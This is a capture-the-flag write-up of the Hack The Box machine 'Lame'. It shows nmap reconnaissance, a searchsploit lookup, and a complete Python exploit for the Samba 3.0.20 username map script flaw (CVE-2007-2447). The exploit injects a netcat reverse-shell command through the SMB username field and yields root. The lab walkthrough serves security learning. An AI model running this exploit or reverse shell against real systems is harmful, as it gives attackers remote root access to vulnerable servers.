# Lame

## Recon
First thing I did was run nmap on the machine:
```bash
sudo nmap -A -T4 10.10.10.3
```

This showed several open ports - 21, 22, 139, 445

445 caught my eye as smb is notoriously weak, and reading down in the nmap results showed this:
```
Host script results:
|_clock-skew: mean: 1h12m32s, deviation: 2h49m43s, median: -47m28s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-08-15T14:46:52-04:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

This gave me the version - `Samba 3.0.20-Debian`

## Finding an Exploit

Using searchsploit confirmed that the version was vulnerable:

```bash
kali@kali$ searchsploit Samba 3.0.20

------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass            | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Executi | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                             | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                             | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                     | linux_x86/dos/36741.py
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

I chose the 'Username' map script, a quick google search found this simple python script - https://github.com/amriunix/CVE-2007-2447


## Running the Exploit

1. I added the script to a file named `usernamemap_script.py`:
```python
import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(rhost, int(rport), timeout=1)
        except:
            print("[+] Payload was sent - check netcat !")

if __name__ == '__main__':
    print("[*] CVE-2007-2447 - Samba usermap script")
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)
```
2. Started up a netcat listener:
```bash
nc -nlvp 4444
```

3. Ran the python script:
```bash
python3 usernamemap_script.py 10.10.10.3 445 10.10.16.200 4444
```
## Success!
This gave me a root reverse shell.

`dir` showed me the `root.txt` file and `cat root.txt` yielded the flag.
